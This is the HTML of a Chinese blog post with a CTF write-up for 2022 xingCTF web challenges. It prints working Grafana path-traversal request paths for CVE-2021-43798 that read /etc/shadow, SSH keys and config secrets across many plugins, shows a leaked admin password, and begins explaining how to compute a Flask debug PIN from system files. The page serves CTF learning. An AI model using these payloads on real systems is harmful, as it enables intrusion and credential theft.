@@ -1,0 +1,665 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="H0ne">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="这次比赛体验也还行，题目质量出的很高，把wp记录下来 WEB：oh-my-grafana这个题目考的是grafana任意文件读取漏洞（CVE-2021-43798）2021年12月6日，国外安全研究人员检测出grafana中某些接口在提供静态文件时，攻击者通过构造恶意请求，可造成目录遍历，读取系统上的文件。读取敏感文件复现poc: 123456789101112131415161718192021">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022-xingCTF-WEB">
+<meta property="og:url" content="http://example.com/2023/04/20/2022-xingCTF-WEB/index.html">
+<meta property="og:site_name" content="H0ne&#39;s Blog">
+<meta property="og:description" content="这次比赛体验也还行，题目质量出的很高，把wp记录下来 WEB：oh-my-grafana这个题目考的是grafana任意文件读取漏洞（CVE-2021-43798）2021年12月6日，国外安全研究人员检测出grafana中某些接口在提供静态文件时，攻击者通过构造恶意请求，可造成目录遍历，读取系统上的文件。读取敏感文件复现poc: 123456789101112131415161718192021">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/67a229c7b8a745f4a5c61623f8d94bb9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBASDBuZQ==,size_13,color_FFFFFF,t_70,g_se,x_16">
+<meta property="article:published_time" content="2023-04-20T15:33:27.599Z">
+<meta property="article:modified_time" content="2022-04-25T12:43:24.000Z">
+<meta property="article:author" content="H0ne">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/67a229c7b8a745f4a5c61623f8d94bb9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBASDBuZQ==,size_13,color_FFFFFF,t_70,g_se,x_16">
+  
+  
+  
+  <title>2022-xingCTF-WEB - H0ne&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/fluid-extension.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>H0ne&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2022-xingCTF-WEB"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-20 23:33" pubdate>
+          2023年4月20日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          11k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          88 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">2022-xingCTF-WEB</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>这次比赛体验也还行，题目质量出的很高，把wp记录下来<br><img src="https://img-blog.csdnimg.cn/67a229c7b8a745f4a5c61623f8d94bb9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBASDBuZQ==,size_13,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h2 id="WEB："><a href="#WEB：" class="headerlink" title="WEB："></a>WEB：</h2><h3 id="oh-my-grafana"><a href="#oh-my-grafana" class="headerlink" title="oh-my-grafana"></a>oh-my-grafana</h3><p>这个题目考的是grafana任意文件读取漏洞（CVE-2021-43798）<br>2021年12月6日，国外安全研究人员检测出grafana中某些接口在提供静态文件时，攻击者通过构造恶意请求，可造成目录遍历，读取系统上的文件。<br>读取敏感文件复现poc:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/alertlist/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/alertlist/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>var<span class="hljs-regexp">/lib/g</span>rafana/grafana.db <span class="hljs-comment">#读取数据库文件</span><br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/alertlist/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc<span class="hljs-regexp">/grafana/g</span>rafana.ini <span class="hljs-comment">#读取配置文件</span><br> 还可以读取的其他文件<br> <span class="hljs-regexp">/conf/</span>defaults.ini<br><br><span class="hljs-regexp">/etc/g</span>rafana/grafana.ini<br><br><span class="hljs-regexp">/etc/</span>passwd<br><br><span class="hljs-regexp">/etc/</span>shadow<br><br><span class="hljs-regexp">/home/g</span>rafana/.bash_history<br><br><span class="hljs-regexp">/home/g</span>rafana<span class="hljs-regexp">/.ssh/i</span>d_rsa<br><br><span class="hljs-regexp">/root/</span>.bash_history<br><br><span class="hljs-regexp">/root/</span>.ssh/id_rsa<br><br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/etc/g</span>rafana/grafana.ini<br><br><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/grafana/g</span>rafana.db<br><br><span class="hljs-regexp">/proc/</span>net/fib_trie<br><br><span class="hljs-regexp">/proc/</span>net/tcp<br><br><span class="hljs-regexp">/proc/</span>self/cmdline<br></code></pre></td></tr></table></figure>
+<p>该漏洞是由于grafana plugins引发的目录穿越漏洞导致任意文件读取，上述截图仅展示了grafana-clock-panel插件的效果。官方公布的受影响Plugins为40个。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/alertGroups/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/alertlist/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/alertmanager/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/annolist/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/barchart/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/bargauge/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/canvas/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/cloudwatch/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/dashboard/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/dashlist/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/debug/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/elasticsearch/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/gauge/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/geomap/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/gettingstarted/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/grafana-azure-monitor-datasource/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/grafana/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/graph/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/graphite/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/heatmap/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/histogram/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/influxdb/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/jaeger/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/live/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/logs/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/loki/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/mixed/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/mssql/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/mysql/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/news/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/nodeGraph/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/opentsdb/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/piechart/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/pluginlist/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/postgres/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/prometheus/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/stat/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/state-timeline/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/status-history/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/table-old/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/table/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/tempo/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/testdata/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/text/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/timeseries/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/welcome/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/xychart/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/zipkin/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br></code></pre></td></tr></table></figure>
+<p>该题目就是grafana存在未鉴权状态下的任意文件读取。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/alertlist/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd<br><span class="hljs-regexp">/public/</span>plugins<span class="hljs-regexp">/alertlist/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/g</span>rafana/grafana.ini<br></code></pre></td></tr></table></figure>
+<p>读取到这个</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># default admin user, created on startup</span><br><span class="hljs-attr">admin_user</span> = admin<br><br><span class="hljs-comment"># default admin password, can be changed before first start of grafana,  or in profile settings</span><br><span class="hljs-attr">admin_password</span> = <span class="hljs-number">5</span>f989714e132c9b04d4807dafeb10ade<br><br><br><span class="hljs-comment"># Either &quot;mysql&quot;, &quot;postgres&quot; or &quot;sqlite3&quot;, it&#x27;s your choice</span><br><span class="hljs-comment">;type = mysql</span><br><span class="hljs-comment">;host = mysql:3306</span><br><span class="hljs-comment">;name = grafana</span><br><span class="hljs-comment">;user = grafana</span><br><span class="hljs-comment"># If the password contains # or ; you have to wrap it with triple quotes. Ex &quot;&quot;&quot;#password;&quot;&quot;&quot;</span><br><span class="hljs-comment">;password = grafana</span><br></code></pre></td></tr></table></figure>
+<p>admin的密码是5f989714e132c9b04d4807dafeb10ade，利用Configuration里的Data sources功能，指定加载远程MySQL数据服务，通过执行SQL语句读取表信息和列信息，最后读出flag。</p>
+<h3 id="oh-my-notepro"><a href="#oh-my-notepro" class="headerlink" title="oh-my-notepro"></a>oh-my-notepro</h3><p>Flask debug模式算pin码，pin码也就是flask在开启debug模式下，进行代码调试模式的进入密码，需要正确的PIN码才能进入调试模式<br>PIN生成要素</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> username，用户名<br><span class="hljs-bullet">2.</span> modname，默认值为flask.app<br><span class="hljs-bullet">3.</span> appname，默认值为Flask<br><span class="hljs-bullet">4.</span> moddir，flask库下app.py的绝对路径<br><span class="hljs-bullet">5.</span> uuidnode，当前网络的mac地址的十进制数<br><span class="hljs-bullet">6.</span> machine<span class="hljs-emphasis">_id，docker机器id</span><br></code></pre></td></tr></table></figure>
+<p>username<br>通过getpass.getuser()读取，通过文件读取&#x2F;etc&#x2F;passwd</p>
+<p>modname<br>通过getattr(mod,“file”,None)读取，默认值为flask.app</p>
+<p>appname<br>通过getattr(app,“name”,type(app).name)读取，默认值为Flask</p>
+<p>moddir<br>当前网络的mac地址的十进制数，通过getattr(mod,“file”,None)读取实际应用中通过报错读取</p>
+<p>uuidnode<br>通过uuid.getnode()读取，通过文件&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address得到16进制结果，转化为10进制进行计算</p>
+<p>machine_id<br>每一个机器都会有自已唯一的id，linux的id一般存放在&#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id，docker靶机则读取&#x2F;proc&#x2F;self&#x2F;cgroup，其中第一行的&#x2F;docker&#x2F;字符串后面的内容作为机器的id，在非docker环境下读取后两个，非docker环境三个都需要读取</p>
